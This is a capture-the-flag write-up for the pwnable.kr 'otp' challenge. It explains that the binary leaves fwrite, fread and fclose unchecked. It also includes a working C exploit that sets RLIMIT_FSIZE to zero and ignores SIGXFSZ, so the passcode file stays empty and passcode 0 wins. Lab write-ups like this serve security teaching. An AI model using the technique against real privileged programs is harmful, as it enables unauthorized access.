# OTP

```
I made a skeleton interface for one time password authentication system.
I guess there are no mistakes.
could you take a look at it?

hint : not a race condition. do not bruteforce.
```

## What does the binary do?

```
otp@pwnable:~$ ls
flag  otp  otp.c
otp@pwnable:~$ ./otp
usage : ./otp [passcode]
otp@pwnable:~$ ./otp my_passcode
OTP generated.
OTP mismatch
```

- Receives a passcode as a command line argument
- Generating an OTP
- Comparing it to the given passcode


## Executable Information

```bash
⋊> /m/o/o/d/w/c/p/otp on master ⨯ file otp                                                                                                                                                         09:41:29
otp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=f851771b439725c55be4ed4b0e102c2a39f4c196, not stripped

⋊> /m/o/o/d/w/c/p/otp on master ⨯ checksec otp                                                                                                                                                     09:41:31
[*] '/media/or/organic_drive/disk_content/workspace/ctfs/pwnable/otp/otp'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


## Inspecting the Code

The code works as follows:
 - Read 2 `unsigned long long` numbers from /dev/urandom.
 - Create a file in the path: `/tmp/<first unsigned long long>`.
 - Write the seconds unsigned long long into it.
 - Close the file.
 - Open the file again (in read mode).
 - Read it contents.
 - Put it in `passcode` variable.
 - Compare it to the passcode provided in the argument.
 - If correct, print the flag.
 - Remove the `/tmp/<unsigned long long>` file.
 - quit.
 


After understanding what the code does, I tried to find a bugs that will provide
me a lead of how the hell can I pwn this challange.

I found out that when the code uses `open()` and `read()`, it checks the return code of it.
**But in the following code, `fwrite`, `fread`, `fclose` are not checked**

Why is it interesting? Imagine that the binary managed to open the /tmp file, and then attempted
to write something to it, and it failed.

When it will attemt reading the next time, its value will be 0. 
so if we provide passcode 0 we win.


### How can we make `write` fail?

We can use the `setrlimit` function. (read `man setrlimit`).
This function enables us to set resource limit on our process. These limits also enforced for all child processes, and even
preserve when calling the `exec` syscall.

By using this function, we can limit the file size that the process creates to ZERO!
which means the `write` will fail.


```C
#include <sys/time.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <signal.h>


int main() {
    // The rlimit struct has 2 fields:
    // - rlim_cur: Current limit, can be set by other processes as well.
    // - rlim_max: Upper bound that the rlim_cur can be set to.
    //
    // We want both of them to be 0 so our process will not be able to write any files.
    struct rlimit file_size_limit;
    file_size_limit.rlim_cur = 0;
    file_size_limit.rlim_max = 0;

    // Set the limit on RLIMIT_FSIZE
    setrlimit(RLIMIT_FSIZE, &file_size_limit);

    // By default, when the limit is reached, SIGXFSZ is sent to the process and it gets
    // killed. We want to ignore this signal for the app to continue even after the failure.
    signal(SIGXFSZ, SIG_IGN);

    // The passcode is 0 since 0 bytes will be written to the file.
    system("/home/otp/otp 0");
}
```





## Pwned

```
otp@pwnable:~$ /tmp/mydirr/payload
OTP generated.
Congratz!
Darn... I always forget to check the return value of fclose() :(
```

